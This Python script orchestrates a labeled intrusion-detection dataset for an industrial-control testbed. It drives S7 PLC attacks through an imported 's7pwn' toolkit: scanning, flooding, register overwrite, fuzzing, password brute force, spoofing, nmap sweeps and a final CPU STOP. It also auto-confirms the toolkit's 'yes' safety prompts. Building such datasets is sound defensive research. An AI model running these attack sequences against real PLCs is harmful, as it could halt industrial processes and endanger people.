#!/usr/bin/env python3
"""
Dataset Orchestrator cho Kiến trúc Testbed 3 Máy (Attacker, Controller, Switch)
Bao gồm:
1. Gán nhãn Labeling (Timestamp -> Label -> Metadata)
2. Ground Truth Polling (Lấy giá trị thực tế của PLC)
3. Hỗ trợ Role-based Execution (--role attacker | --role controller)
"""

import sys
import time
import argparse
import subprocess
import multiprocessing
import threading
import os
import csv

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from s7pwn.command_router import dispatch
from s7pwn.commands.target import set_target

# ==========================================
# 1. LOGGING & GROUND TRUTH MODULES
# ==========================================

class DatasetLogger:
    """Ghi nhận log Timestamp -> Trạng thái -> Loại Attack (Metadata)"""
    def __init__(self, filename="dataset_labels.csv"):
        self.filename = os.path.join(os.path.dirname(os.path.abspath(__file__)), filename)
        # Khởi tạo file với header nếu chưa có
        if not os.path.exists(self.filename):
            with open(self.filename, mode='w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(["absolute_timestamp", "day", "role", "activity", "attack_type", "intensity", "label_is_attack", "note"])
                
    def log(self, day, role, activity, attack_type, intensity, is_attack, note):
        with open(self.filename, mode='a', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([time.time(), day, role, activity, attack_type, intensity, int(is_attack), note])

def console_log(msg):
    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}")

def ground_truth_poller(target_ip, duration):
    """
    Tiến trình chỉ chạy trên Controller.
    Định kỳ lấy giá trị thực tế của PLC và ghi vào file để đối chiếu (Ground Truth).
    """
    console_log("[Controller] Đang bật tính năng lấy Ground Truth PLC...")
    start_t = time.time()
    filename = os.path.join(os.path.dirname(os.path.abspath(__file__)), "plc_ground_truth.csv")
    
    if not os.path.exists(filename):
        with open(filename, mode='w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(["absolute_timestamp", "Target_IP", "Value_M0_0", "Value_DB1_0"])
            
    while time.time() - start_t < duration:
        # TẠI ĐÂY LÝ TƯỞNG NHẤT LÀ CẦN API TRA VỀ GIÁ TRỊ TỪ S7PWN (ví dụ dispatch_return('read',...))
        # Hiện tại mock lại việc ghi ground truth:
        try:
            with open(filename, mode='a', newline='') as f:
                writer = csv.writer(f)
                # THAY THẾ BẰNG GIÁ TRỊ GET TỪ PLC
                writer.writerow([time.time(), target_ip, "N/A", "N/A"])
        except Exception:
            pass
        time.sleep(1)  # Tần suất lấy mẫu 1s/lần

# ==========================================
# 2. WORKERS & ACTIVITY VECTORS
# ==========================================

def run_it_noise(target_ip):
    """Giả lập nhiễu nền IT"""
    while True:
        subprocess.run(["curl", "-s", "--connect-timeout", "1", f"http://{target_ip}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)

def rwrite_worker():
    """Worker tấn công đè logic (Attacker)"""
    dispatch("rwrite", ["M0.0=1:bool", "DB1.0=999:int"])

def flood_worker(duration):
    """Worker tấn công DoS Flood (Attacker)"""
    dispatch("flood", ["200", str(int(duration))])

def scan_worker(target_subnet):
    """Worker chạy scan (Attacker)"""
    dispatch("scan", [target_subnet, "--protocols", "s7"])

def stop_plc_worker():
    """Worker tấn công dừng CPU (Attacker)"""
    import builtins
    old_input = builtins.input
    builtins.input = lambda prompt="": "yes"
    try:
        dispatch("cpu_control", ["stop"])
    except Exception: pass
    finally:
        builtins.input = old_input

def auth_brute_worker():
    """Worker tấn công Brute Force Password (Attacker)"""
    import builtins
    old_input = builtins.input
    builtins.input = lambda prompt="": "yes"
    try:
        dispatch("auth", ["bruteforce"])
    except Exception: pass
    finally:
        builtins.input = old_input

def fuzz_worker():
    """Worker tấn công Fuzzing giao thức (Attacker)"""
    dispatch("fuzz", ["--mode", "full", "--count", "5000"])

def spoof_worker():
    """Worker tấn công Spoof/Giả mạo gói tin (Attacker)"""
    dispatch("spoof", ["M0.0=1:bool", "--mode", "constant"])


# ==========================================
# 3. KỊCH BẢN TỪNG NGÀY THEO ROLE
# ==========================================
# label: 0 (Normal), 1 (Attack)

def day1_benign(target_ip, duration, role, logger):
    """NGÀY 1: CHỈ CÓ LƯU LƯỢNG HỢP LỆ"""
    if role == "attacker":
        console_log("Ngày 1 không yêu cầu hoạt động từ Attacker. Máy attacker nghỉ ngơi.")
        return

    # Role Controller
    console_log(f"=== NGÀY 1: LƯU LƯỢNG BÌNH THƯỜNG (BENIGN) ===")
    logger.log(1, role, "benign_traffic", "none", "none", False, "Bắt đầu chạy lưu lượng HMI hợp lệ")
    
    p_noise = multiprocessing.Process(target=run_it_noise, args=(target_ip,))
    p_noise.start()
    
    p_gt = multiprocessing.Process(target=ground_truth_poller, args=(target_ip, duration))
    p_gt.start()

    set_target([target_ip, "0", "1"])
    start_t = time.time()
    
    try:
        while time.time() - start_t < duration:
            dispatch("read", ["M0.0:bool", "DB1.0:int"])
            time.sleep(1)
            dispatch("write", ["M0.0=1:bool", "DB1.0=100:int"])
            time.sleep(2)
    except KeyboardInterrupt:
        pass
    finally:
        p_noise.terminate()
        p_gt.terminate()
        logger.log(1, role, "benign_traffic", "none", "none", False, "Hoàn tất Ngày 1")


def day2_dos(target_ip, target_subnet, duration, role, logger):
    """NGÀY 2: TẤN CÔNG DoS / SCAN"""
    if role == "controller":
        console_log("Controller chạy luồng Benign nền cho Ngày 2.")
        day1_benign(target_ip, duration, role, logger) # Controller vẫn phải giao tiếp với PLC
        return

    # Role Attacker
    console_log("=== NGÀY 2: TẤN CÔNG DIỆN RỘNG VÀ TỪ CHỐI DỊCH VỤ (DoS) ===")
    logger.log(2, role, "dos_attack", "s7_scan_and_flood", "high", True, "Bắt đầu Scan và Flood")
    set_target([target_ip, "0", "1"])
    
    p_scan = multiprocessing.Process(target=scan_worker, args=(target_subnet,))
    p_scan.start()
    p_scan.join()
    
    p_flood = multiprocessing.Process(target=flood_worker, args=(duration,))
    p_flood.start()
    
    try:
        p_flood.join(duration)
    except KeyboardInterrupt:
        pass
    finally:
        if p_flood.is_alive():
            p_flood.terminate()
        logger.log(2, role, "dos_attack", "s7_scan_and_flood", "none", True, "Kết thúc Attack Ngày 2")

def day3_logic(target_ip, duration, role, logger):
    """NGÀY 3: GHI ĐÈ LOGIC (RWRITE) VÀ FUZZING GIAO THỨC"""
    if role == "controller":
        console_log("Controller chạy luồng Benign nền cho Ngày 3.")
        day1_benign(target_ip, duration, role, logger)
        return

    # Role Attacker
    console_log("=== NGÀY 3: TẤN CÔNG GHI ĐÈ LOGIC VÀ FUZZING ===")
    logger.log(3, role, "logic_manipulation", "rwrite_and_fuzz", "high", True, "Attacker chạy rwrite và fuzzing")
    set_target([target_ip, "0", "1"])
    
    p_rwrite = multiprocessing.Process(target=rwrite_worker)
    p_fuzz = multiprocessing.Process(target=fuzz_worker)
    
    p_rwrite.start()
    p_fuzz.start()
    
    start_t = time.time()
    try:
        while time.time() - start_t < duration:
            dispatch("write", ["DB1.2=9999:int"]) # Thao tác giả lừa mạng
            time.sleep(2)
    except KeyboardInterrupt:
        pass
    finally:
        p_rwrite.terminate()
        if p_fuzz.is_alive(): p_fuzz.terminate()
        logger.log(3, role, "logic_manipulation", "rwrite_and_fuzz", "none", True, "Attacker ngừng tấn công Ngày 3")

def day4_infiltration(target_ip, target_subnet, duration, role, logger):
    """NGÀY 4: GIA TĂNG ĐẶC QUYỀN VÀ GIẢ MẠO (AUTH BRUTEFORCE + SPOOF)"""
    if role == "controller":
        console_log("Controller chạy luồng Benign nền.")
        day1_benign(target_ip, duration, role, logger)
        return

    # Role Attacker
    console_log("=== NGÀY 4: INFILTRATION - AUTH BRUTEFORCE VÀ SPOOF ===")
    logger.log(4, role, "infiltration", "auth_spoof", "high", True, "Chạy Nmap, Auth Bruteforce, Spoof")
    set_target([target_ip, "0", "1"])
    
    p_auth = multiprocessing.Process(target=auth_brute_worker)
    p_spoof = multiprocessing.Process(target=spoof_worker)
    
    p_auth.start()
    p_spoof.start()
    
    start_t = time.time()
    try:
        while time.time() - start_t < duration:
            subprocess.run(["nmap", "-T4", "-A", "-sS", "-Pn", target_subnet], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(15) 
    except KeyboardInterrupt:
        pass
    finally:
        if p_auth.is_alive(): p_auth.terminate()
        if p_spoof.is_alive(): p_spoof.terminate()
        logger.log(4, role, "infiltration", "auth_spoof", "none", True, "Kết thúc Attack Ngày 4")

def day5_combined(target_ip, target_subnet, duration, role, logger):
    """NGÀY 5: TẤN CÔNG TỔNG HỢP VÀ DỪNG HỆ THỐNG (CPU STOP)"""
    if role == "controller":
        console_log("Controller chạy luồng Benign nền.")
        day1_benign(target_ip, duration, role, logger)
        return

    # Role Attacker
    console_log("=== NGÀY 5: KẾT HỢP TỔNG LỰC ĐA DẠNG TẤN CÔNG (CRITICAL IMPACT) ===")
    logger.log(5, role, "combined", "all_plus_stop", "extreme", True, "Kích hoạt mọi Vector")
    
    set_target([target_ip, "0", "1"])
    p_rwrite = multiprocessing.Process(target=rwrite_worker)
    p_flood = multiprocessing.Process(target=flood_worker, args=(duration,))
    p_fuzz = multiprocessing.Process(target=fuzz_worker)
    
    p_rwrite.start()
    p_flood.start()
    p_fuzz.start()
    
    start_t = time.time()
    try:
        while time.time() - start_t < duration:
            subprocess.Popen(["nmap", "-p", "102,502", "-sS", target_subnet], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(15)
    except KeyboardInterrupt:
        pass
    finally:
        if p_rwrite.is_alive(): p_rwrite.terminate()
        if p_flood.is_alive(): p_flood.terminate()
        if p_fuzz.is_alive(): p_fuzz.terminate()
        
        # Ở CHUẨN BỊ KẾT THÚC NGÀY 5 CHÚNG TA ĐÓNG BĂNG PLC BẰNG CPU CONTROL STOP
        console_log("[!] THỰC THI LỆNH DỪNG PLC (CPU STOP) ...")
        logger.log(5, role, "critical_impact", "cpu_stop", "extreme", True, "Gửi lệnh ngừng PLC (STOP)")
        p_stop = multiprocessing.Process(target=stop_plc_worker)
        p_stop.start()
        p_stop.join(10)
        if p_stop.is_alive(): p_stop.terminate()
        
        logger.log(5, role, "combined", "all_plus_stop", "none", True, "Hoàn tất Ngày 5")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Công cụ Tự động thu thập OT Dataset (Tách biệt 3 Máy)")
    parser.add_argument("--role", choices=["attacker", "controller"], required=True, help="Vai trò của máy chạy script này")
    parser.add_argument("--day", type=int, choices=[1,2,3,4,5], required=True, help="Ngày chạy (1-5)")
    parser.add_argument("--ip", type=str, required=True, help="IP của mục tiêu PLC")
    parser.add_argument("--subnet", type=str, required=False, default="192.168.1.0/24", help="Subnet phục vụ scanning")
    parser.add_argument("--duration", type=int, default=3600, help="Thời lượng (giây)")
    
    args = parser.parse_args()
    logger = DatasetLogger("dataset_labels.csv")

    try:
        if args.day == 1:
            day1_benign(args.ip, args.duration, args.role, logger)
        elif args.day == 2:
            day2_dos(args.ip, args.subnet, args.duration, args.role, logger)
        elif args.day == 3:
            day3_logic(args.ip, args.duration, args.role, logger)
        elif args.day == 4:
            day4_infiltration(args.ip, args.subnet, args.duration, args.role, logger)
        elif args.day == 5:
            day5_combined(args.ip, args.subnet, args.duration, args.role, logger)
    except Exception as e:
        console_log(f"Lỗi: {e}")
